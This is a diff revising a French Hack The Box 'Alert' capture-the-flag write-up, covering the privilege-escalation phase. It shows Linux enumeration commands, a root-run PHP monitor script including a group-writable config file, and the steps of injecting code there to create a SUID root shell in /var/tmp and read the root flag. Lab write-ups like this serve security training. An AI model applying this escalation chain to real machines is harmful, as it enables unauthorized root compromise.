@@ -854,19 +854,15 @@ Tu peux maintenant passer à la phase suivante : l’escalade de privilèges.
 
 ### Sudo -l
 
-**Résultat**
-
 ```bash
 Sorry, user albert may not run sudo on alert.
 ```
 
-Tu élimines une piste souvent rencontrée en CTF et poursuis ton énumération.
+Aucune commande sudo exploitable. Tu poursuis l’énumération.
 
 ------
 
 ### Recherche de binaires SUID
-
-Tu poursuis l’énumération en recherchant les binaires SUID, qui permettent parfois d’exécuter des commandes avec les privilèges de leur propriétaire.
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
@@ -893,15 +889,11 @@ find / -perm -4000 -type f 2>/dev/null
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
 
-Il s’agit uniquement de binaires système standards, sans piste d’exploitation directe.
-
-Aucun binaire SUID exploitable dans ce cas.
+l s’agit uniquement de binaires système standards. Aucun binaire exploitable ici.
 
 ------
 
 ### Analyse des Linux capabilities
-
-Tu vérifies ensuite les capabilities Linux, qui permettent à certains binaires d’effectuer des actions privilégiées sans être root.
 
 ```bash
 getcap -r / 2>/dev/null
@@ -916,15 +908,11 @@ getcap -r / 2>/dev/null
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 ```
 
-Aucune capability exploitable dans ce contexte.
-
-Ces `capabilities` sont liées au réseau et ne permettent pas d’exécuter du code en root.
+Ces capabilities sont liées au réseau et ne permettent pas d’obtenir une élévation de privilèges.
 
 ------
 
 ### Inspection des tâches cron
-
-Tu vérifies ensuite les tâches planifiées :
 
 ```bash
 cat /etc/crontab
@@ -939,13 +927,11 @@ cat /etc/crontab
 52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 ```
 
-Aucune tâche personnalisée ou modifiable par l’utilisateur n’est présente.
+Aucune tâche exploitable.
 
 ------
 
 ### Analyse des services locaux
-
-Tu identifies ensuite les services en écoute :
 
 ```bash
 netstat -tulpn
@@ -959,36 +945,32 @@ tcp        0      0 0.0.0.0:22              LISTEN
 tcp6       0      0 :::80                   LISTEN
 ```
 
-Un service est accessible uniquement en local sur le port `127.0.0.1:8080`, ce qui peut être intéressant mais ne constitue pas une piste immédiate.
+Un service est accessible uniquement en local sur le port `127.0.0.1:8080`, sans piste d’exploitation immédiate.
 
 ### Choix du répertoire de travail
 
-Tu remarques rapidement que les répertoires `/tmp` et `/dev/shm` sont régulièrement nettoyés sur cette machine.
+Les répertoires `/tmp` et `/dev/shm` sont régulièrement nettoyés sur cette machine, un comportement courant en CTF.
 
-Ce comportement est fréquent sur les machines CTF.
+Pour éviter la suppression de tes fichiers (scripts, outils, payloads), tu dois utiliser un répertoire :
 
-Cela pose un problème : les fichiers que tu y déposes (scripts, outils, payloads) peuvent disparaître avant d’être exploités.
+\- accessible en lecture et en écriture par l’utilisateur `albert`
+\- non soumis à un mécanisme de nettoyage
 
-Il est donc nécessaire de trouver un répertoire :
-
-- accessible en lecture et en écriture par l’utilisateur `albert`
-- non soumis à un mécanisme de nettoyage
-
-Tu peux identifier les répertoires accessibles avec :
+Tu identifies les répertoires accessibles avec :
 
 ```bash
 find / -type d -writable 2>/dev/null
 ```
 
-Parmi les résultats, le répertoire `/var/tmp` attire l’attention.
+Le répertoire `/var/tmp` répond à ces critères.
 
-Contrairement à `/tmp` et `/dev/shm`, il n’est pas nettoyé automatiquement et permet de conserver les fichiers plus longtemps.
+Contrairement à `/tmp` et `/dev/shm`, il n’est pas nettoyé automatiquement et permet de conserver les fichiers.
 
-**Tu utilises donc `/var/tmp` comme répertoire de travail pour la suite de l’exploitation.**
+**Tu utilises donc `/var/tmp` comme répertoire de travail pour la suite.**
 
 ### Analyse automatisée des SUID avec suid3num.py
 
-Pour compléter la recherche manuelle des binaires SUID, tu utilises l’outil `suid3num.py`, qui permet d’identifier rapidement les binaires potentiellement exploitables et de les comparer avec les entrées connues de [GTFOBins](https://gtfobins.org/). Cela permet de gagner du temps par rapport à une analyse manuelle.
+Pour compléter la recherche manuelle, tu utilises `suid3num.py`, qui permet d’identifier rapidement les binaires SUID potentiellement exploitables.
 
 Tu le télécharges et l’exécutes depuis `/var/tmp` :
 
@@ -1026,15 +1008,13 @@ python3 suid3num.py
 [!] None :(
 ```
 
-Aucun binaire SUID personnalisé ni exploitable n’est identifié.
-
-Tu confirmes ainsi que la piste des binaires SUID ne mène à rien dans ce cas précis, ce qui t’oriente vers d’autres vecteurs d’escalade de privilèges.
+Aucun binaire SUID exploitable n’est identifié. Tu poursuis l’énumération.
 
 ------
 
-### pspy64
+### Observation des processus avec pspy64
 
-Tu lances également `pspy64` dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.
+Tu lances `pspy64` dans une seconde session SSH pour observer les processus exécutés sur la machine.
 
 Tu le télécharges et l’exécutes depuis le répertoire persistant (`/var/tmp`) :
 
@@ -1045,84 +1025,75 @@ chmod +x pspy64
 ./pspy64
 ```
 
-pspy64 permet d’observer les processus exécutés par root sans privilèges élevés.
-
-Très rapidement, une activité répétée toutes les minutes attire ton attention :
+Une activité récurrente apparaît rapidement :
 
 ```bash
 CMD: UID=0 | /usr/bin/php -f /opt/website-monitor/monitor.php
 ```
 
-Tu sais donc que `/opt/website-monitor/monitor.php` est lancé régulièrement avec les privilèges root.
+Le script `/opt/website-monitor/monitor.php` est exécuté régulièrement avec les privilèges root.
 
-C’est exactement le type de situation que tu recherches pour une escalade de privilèges : un script exécuté par root que tu peux modifier ou détourner.
+C’est une piste intéressante : un script lancé par root et accessible côté utilisateur.
 
-Tu poursuis donc l’analyse en examinant le contenu de `monitor.php`.
+Tu poursuis l’analyse en examinant son contenu.
 
 ### Analyse de `monitor.php`
 
 Grâce à `pspy64`, tu as identifié l’exécution régulière du script suivant par root :
 
-```
+```bash
 /usr/bin/php -f /opt/website-monitor/monitor.php
 ```
 
 En analysant ce script, tu repères l’inclusion du fichier :
 
-```
+```bash
 include('config/configuration.php');
 ```
 
-Tu vérifies alors les permissions de ce fichier :
+Tu vérifies ses permissions :
 
-```
+```bash
 ls -l /opt/website-monitor/config/configuration.php
 -rwxrwxr-x 1 root management ...
 ```
 
-Tu identifies ici une combinaison critique :
+Ce fichier est modifiable par le groupe `management`, auquel appartient `albert`.
 
-- fichier modifiable
-- exécuté par root
+Tu affiches son contenu :
 
-L’utilisateur `albert`, membre du groupe `management`, peut donc modifier ce fichier.
-
-Tu affiches ensuite son contenu :
-
-```
+```bash
 cat /opt/website-monitor/config/configuration.php
 <?php
 define('PATH', '/opt/website-monitor');
 ?>
 ```
 
-Ce fichier est chargé automatiquement par un script exécuté en tant que root.
+Ce fichier est chargé par un script exécuté en root.
 
-**Tu peux donc y injecter du code qui sera exécuté avec les privilèges root.**
-
-
+**C’est donc un point d’injection direct pour exécuter du code avec les privilèges root.**
 
 ### Conclusion de l’énumération manuelle
 
-Les vérifications classiques (sudo, SUID, capabilities, cron, services) ne révèlent aucune piste exploitable directement.
+Les vérifications classiques (sudo, SUID, capabilities, cron, services) ne révèlent aucune piste exploitable.
 
-En revanche, l’analyse avec `pspy64` met en évidence un point clé : l’exécution régulière de `/opt/website-monitor/monitor.php` par root.
+L’observation avec `pspy64` met en évidence l’exécution régulière de `/opt/website-monitor/monitor.php` par root.
 
-Ce script devient le point central de l’escalade de privilèges, car il s’exécute automatiquement avec les privilèges root et utilise des fichiers accessibles par l’utilisateur `albert`.
+Ce script constitue le point d’entrée de l’escalade de privilèges : il s’exécute automatiquement avec les privilèges root et utilise un fichier modifiable par l’utilisateur `albert`.
 
-La suite de l’exploitation consiste donc à modifier le fichier `configuration.php`, appelé par `monitor.php`, afin d’y insérer du code et obtenir un accès root.
+Tu peux donc modifier `configuration.php` afin d’y injecter du code et obtenir un accès root.
 
 ### Exploitation
 
-L’analyse de `monitor.php` a montré que le fichier `configuration.php` est exécuté automatiquement par root et modifiable par l’utilisateur `albert`.
+Le fichier `configuration.php` est exécuté par un script lancé en root et modifiable par l’utilisateur `albert`.
 
-L’objectif est donc d’y injecter directement du code afin d’exécuter une commande en tant que root.
+Tu peux donc y injecter du code pour exécuter une commande avec les privilèges root.
 
 **Modification de `configuration.php`**
 
 L’objectif est de créer un binaire SUID root pour obtenir un shell privilégié.
 
-Tu modifies directement le fichier :
+Tu modifies  le fichier :
 
 ```bash
 nano /opt/website-monitor/config/configuration.php
@@ -1150,23 +1121,21 @@ Lors de la sauvegarde, tu observes les messages suivants :
 File was modified since you opened it; continue saving?
 ```
 
-Cela indique que ce fichier est modifié en continu par un processus externe.
+Cela indique que le fichier est modifié en continu par un processus externe.
 
-Tu confirmes la sauvegarde en répondant `Y`, ce qui permet d’injecter temporairement ton payload.
+Tu confirmes avec `Y` pour enregistrer tes modifications.
 
 **Exécution du payload**
 
-Immédiatement après la sauvegarde :
+Au moment de la sauvegarde :
 
-- le code est exécuté par le script lancé en tant que root
+- le code est exécuté par le script root
 - le fichier `/var/tmp/mybashroot` est créé
-- `configuration.php` est restauré automatiquement à son état initial
+- `configuration.php` est restauré automatiquement
 
-Ce comportement montre qu’un mécanisme réécrit le fichier en continu, mais que ton payload est exécuté précisément au moment où tu enregistres les modifications.
+Le payload est donc exécuté avant que le fichier ne soit réécrit.
 
-Le timing est important : ton payload est exécuté avant que le fichier ne soit restauré.
-
-Tu vérifies alors la présence du binaire :
+Tu vérifies :
 
 ```bash
 ls -l /var/tmp/mybashroot
@@ -1174,22 +1143,18 @@ ls -l /var/tmp/mybashroot
 
 **Obtention du shell root**
 
-Une fois le binaire créé avec le bit SUID :
-
 ```bash
 /var/tmp/mybashroot -p
 ```
-
-Puis :
 
 ```bash
 mybashroot-5.0# id
 uid=1000(albert) gid=1000(albert) euid=0(root) groups=1000(albert),1001(management)
 ```
 
-Le shell conserve l’utilisateur `albert`, mais s’exécute avec les privilèges effectifs root (`euid=0`).
+Le shell s’exécute avec les privilèges root (`euid=0`).
 
-Cela suffit pour exécuter des commandes avec les privilèges root, notamment pour lire le flag.
+Tu peux maintenant exécuter des commandes avec les privilèges root.
 
 ### Récupération du flag
 
@@ -1198,37 +1163,28 @@ mybashroot-5.0# cat /root/root.txt
 6276xxxxxxxxxxxxxxxxxxxxxxxxc253
 ```
 
-Tu confirms ainsi l’accès root sur la machine.
+Tu confirmes ainsi l’accès root sur la machine.
 
-**Le flag root est récupéré avec succès, ce qui marque la fin de l’exploitation et du CTF.**
+**Le flag root est récupéré, ce qui marque la fin de l’exploitation.**
 
 
 ---
 
-
-
-
-
-
-
-
-
 ## Conclusion
 
-La machine **Alert (HTB Easy)** illustre parfaitement une chaîne d’exploitation simple et réaliste, basée sur l’enchaînement de plusieurs faiblesses plutôt que sur une vulnérabilité complexe.
+La machine **Alert (HTB Easy)** met en évidence une chaîne d’exploitation complète, de la vulnérabilité web initiale jusqu’à l’obtention d’un accès root.
 
-À partir d’un point d’entrée côté application web, tu as pu récupérer des informations exploitables, obtenir un accès initial à la machine, puis élever progressivement tes privilèges jusqu’à root.
+À partir d’un point d’entrée web, tu récupères des informations exploitables, obtiens un accès initial, puis élève progressivement tes privilèges jusqu’à root.
 
-Ce type de scénario est très courant sur Hack The Box Easy :
+Ce type de scénario est fréquent sur Hack The Box Easy :
 
 - une vulnérabilité web accessible
 - des identifiants réutilisables
-- une escalade de privilèges basée sur une mauvaise configuration
+- une escalade de privilèges liée à une mauvaise configuration
 
-L’intérêt de cette machine réside dans la méthodologie :
- chaque étape est simple individuellement, mais c’est leur enchaînement logique qui permet d’aboutir à la compromission complète du système.
+L’intérêt de cette machine réside dans la méthodologie : chaque étape est simple, mais leur enchaînement permet d’aboutir à une compromission complète du système.
 
-En appliquant une approche structurée — observer, tester, exploiter — tu arrives à un résultat fiable et reproductible, exactement ce qui est attendu dans un contexte CTF ou en situation réelle.
+En appliquant une approche structurée — observer, tester, exploiter — tu obtiens un résultat fiable et reproductible.
 
 ---
 
